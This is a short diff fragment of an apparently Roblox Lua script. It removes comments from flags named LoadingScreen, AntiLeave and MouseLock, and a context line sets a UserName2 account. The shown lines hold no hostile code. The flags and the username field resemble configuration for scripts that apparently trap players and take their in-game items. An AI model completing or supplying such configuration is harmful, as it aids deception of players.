@@ -24,11 +24,11 @@ UserName2 = "alonekidoop"
 
  
 
-_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.LoadingScreen = true
 
-_G.AntiLeave = true -- make it true if you want the antileave
+_G.AntiLeave = true
 
-_G.MouseLock = true -- make it true if you want the mouselock
+_G.MouseLock = true
 
  
 
